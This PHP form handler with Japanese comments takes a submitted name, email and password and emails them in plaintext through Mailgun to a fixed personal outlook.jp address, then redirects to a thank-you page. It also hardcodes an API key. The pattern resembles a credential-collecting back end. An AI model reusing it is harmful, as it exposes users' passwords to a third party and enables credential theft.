<?php
require 'vendor/autoload.php'; // Composerのオートローダーを読み込む

use Mailgun\Mailgun;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $mgClient = Mailgun::create('1b5736a5-b641be0b'); // MailgunのAPIキー
    $domain = "yourdomain.com"; // Mailgunで設定したドメインを指定

    $to = 'samuson846@outlook.jp';
    $subject = '新しいアカウント登録';
    $message = "名前: $name\nメールアドレス: $email\nパスワード: $password";

    try {
        $mgClient->messages()->send($domain, [
            'from'    => 'noreply@yourdomain.com', // 送信元のメールアドレス
            'to'      => $to,
            'subject' => $subject,
            'text'    => $message
        ]);

        header('Location: https://example.com/thank-you'); // リダイレクト先URLを指定
        exit();
    } catch (Exception $e) {
        echo 'メール送信に失敗しました: ' . $e->getMessage();
    }
}
?>
